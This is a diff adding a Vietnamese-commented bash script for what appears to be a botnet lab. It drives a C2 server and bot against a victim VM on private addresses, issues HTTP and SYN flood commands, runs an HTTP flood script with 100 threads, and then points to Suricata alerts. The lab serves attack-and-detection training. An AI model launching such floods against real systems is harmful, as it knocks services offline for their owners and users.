@@ -1,0 +1,53 @@
+#!/bin/bash
+# =====================================================
+# Script: Bước 1 - Chạy tấn công Botnet
+# Từ C2 Server, ra lệnh tấn công Victim
+# =====================================================
+
+C2_IP="10.10.10.10"
+BOT_IP="10.10.10.20"
+VICTIM_IP="10.10.10.30"
+VICTIM_PORT=80
+
+echo "==========================================="
+echo " BƯỚC 1: TẤN CÔNG BOTNET (ATT Lab)"
+echo "==========================================="
+echo " C2 Server  : $C2_IP"
+echo " Bot/Zombie : $BOT_IP"
+echo " Victim     : $VICTIM_IP:$VICTIM_PORT"
+echo "==========================================="
+echo ""
+
+# Kiểm tra kết nối tới victim trước khi tấn công
+echo "[PRE] Kiểm tra victim đang hoạt động..."
+curl -s --connect-timeout 3 "http://$VICTIM_IP/" && echo "" || echo "Victim không phản hồi"
+
+echo ""
+echo "[1] Khởi động Bot Agent trên VM2 (ATT-Bot)..."
+echo "    SSH vào VM2 và chạy:"
+echo "    python3 /opt/bot/bot_agent.py $C2_IP"
+echo ""
+echo "[2] Từ C2 Server (VM1), mở console C2:"
+echo "    python3 /opt/botnet/c2_server.py"
+echo ""
+echo "[3] Trong C2 console, ra lệnh tấn công:"
+echo "    C2> attack $VICTIM_IP $VICTIM_PORT 60 http"
+echo "    C2> attack $VICTIM_IP $VICTIM_PORT 30 syn"
+echo ""
+
+# Giả lập tấn công trực tiếp từ script (nếu không SSH được)
+echo "[ALT] Chạy HTTP Flood trực tiếp từ host WSL..."
+echo "Nhấn Enter để bắt đầu (hoặc Ctrl+C để bỏ qua)"
+read -t 5 || true
+
+echo ""
+echo "[*] Bắt đầu HTTP Flood từ WSL -> Victim ($VICTIM_IP)..."
+python3 /opt/botnet/http_flood.py \
+    --target "http://$VICTIM_IP/" \
+    --threads 100 \
+    --duration 30 2>/dev/null || \
+curl -s "http://$VICTIM_IP/" &
+
+echo ""
+echo "[*] Tấn công hoàn tất. Kiểm tra Suricata alerts trên Victim:"
+echo "    SSH vào VM3 và chạy: /opt/defense/show_stats.sh"
